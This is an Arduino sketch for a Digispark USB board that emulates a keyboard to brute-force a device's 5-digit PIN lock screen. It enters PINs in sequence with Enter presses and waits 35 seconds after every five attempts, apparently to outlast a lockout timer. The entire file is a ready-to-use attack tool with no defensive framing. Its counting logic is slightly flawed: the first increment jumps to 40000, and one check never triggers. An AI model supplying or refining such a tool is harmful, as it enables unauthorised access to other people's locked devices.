#include "DigiKeyboard.h"

const int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
const int maxDigits = 5;
int pin[maxDigits] = {3, 0, 0, 0, 0};
int currentDigit = 0;
int attemptCount = 0;

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  delay(3000);
}

void sendKeyStrokeWithDelay(uint8_t key) {
  DigiKeyboard.sendKeyStroke(key);
  delay(400);
}

void incrementPin() {
  pin[currentDigit]++;
  if (pin[currentDigit] == 10) {
    pin[currentDigit] = 0;
    currentDigit--;
    if (currentDigit < 0) {
      currentDigit = maxDigits - 1;
    }
    incrementPin();
  } else {
    currentDigit = maxDigits - 1;
  }
}

void loop() {
  if (attemptCount == 5) {
    digitalWrite(1, HIGH);
    DigiKeyboard.sendKeyStroke(40);
    delay(35000);
    attemptCount = 0;
    digitalWrite(1, LOW);
  }

  sendKeyStrokeWithDelay(40);
  for (int i = 0; i < maxDigits; i++) {
    if (pin[i] != -1) {
      sendKeyStrokeWithDelay(num[pin[i]]);
    }
  }
  sendKeyStrokeWithDelay(40);
  delay(1000);

  attemptCount++;
  incrementPin();
}
